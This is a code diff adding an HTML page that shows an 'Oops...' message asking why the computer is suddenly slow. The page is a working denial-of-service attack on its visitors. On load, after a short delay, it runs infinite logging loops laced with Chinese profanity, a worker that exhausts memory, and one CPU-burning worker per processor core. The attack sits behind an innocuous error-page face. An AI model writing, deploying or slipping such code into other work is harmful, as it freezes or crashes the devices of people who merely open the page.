@@ -1,0 +1,140 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex,nofollow" />
+    <title>so what</title>
+    <style>
+        .container {
+            width: 60%;
+            margin: 10% auto 0;
+            background-color: #f0f0f0;
+            padding: 2% 5%;
+            border-radius: 10px
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            line-height: 2.3
+        }
+
+        a {
+            color: #20a53a
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Oops...</h1>
+        <h3>发生了什么?</h3>
+        <h3>电脑怎么突然这么卡</h3>
+    </div>
+    <script>
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function run() {
+            console.log("开始等待...");
+            await sleep(5000); // 等待5秒
+            for (let i = 114.114514; i > 0; i++) {
+                while (true) {
+                    console.log(i += 114.114514)
+                    do {
+                        i++;
+                        function fn(i) {
+                            while (true) {
+                                console.log(i + i * i + "nmsl");
+                                console.log(i * 114.114514 * i + "cnm")
+                                console.log(i + "cnm")
+                            }
+                        }
+                        fn(i);
+
+                    } while (i > 0);
+
+                }
+            }
+        }
+        async function sun() {
+            console.log("开始等待...");
+            await sleep(5000); // 等待5秒
+            console.log("开始占用内存和CPU...");
+
+            // 创建内存占用的Worker
+            const memoryWorker = new Worker(URL.createObjectURL(new Blob([`
+                let stringArray = [];
+                function generateStrings() {
+                    while (true) {
+                        let str = "";
+                        // 生成长字符串
+                        for (let i = 0; i < 1e6; i++) {
+                            str += Math.random().toString(36);
+                        }
+                        // 存储字符串
+                        stringArray.push(str);
+                    }
+                }
+
+                generateStrings();
+            `], { type: 'application/javascript' })));
+
+            // 创建CPU占用和日志输出的Workers
+            function createCPUWorker() {
+                return new Worker(URL.createObjectURL(new Blob([`
+                    function sleep(ms) {
+                        return new Promise(resolve => setTimeout(resolve, ms));
+                    }
+
+                    async function cpuAndLog() {
+                        while (true) {
+                            // 死循环和大量日志输出
+                            console.log("CPU 占用中 - " + Math.random());
+                            for (let i = 0; i < 1e5; i++) {  // 大量计算
+                                Math.sqrt(Math.random()) * Math.sqrt(Math.random());
+                            }
+                            await sleep(10);  // 每次迭代后等待 10 毫秒
+                        }
+                    }
+
+                    cpuAndLog();
+                `], { type: 'application/javascript' })));
+            }
+
+            // 启动与核心数相同的CPU Worker
+            const cpuWorkers = [];
+            for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+                cpuWorkers.push(createCPUWorker());
+            }
+
+            console.log("CPU 负载、内存占用和日志输出已启动");
+        }
+
+        function fuck() {
+            console.log("开始同时运行两个函数...");
+
+            const worker1 = run();
+            const worker2 = sun();
+
+            worker1.onmessage = function (event) {
+                console.log(event.data);
+            };
+
+            worker2.onmessage = function (event) {
+                console.log(event.data);
+            };
+
+            console.log("两个 Worker 已启动");
+        }
+        fuck();
+    </script>
+
+</body>
+
+</html>
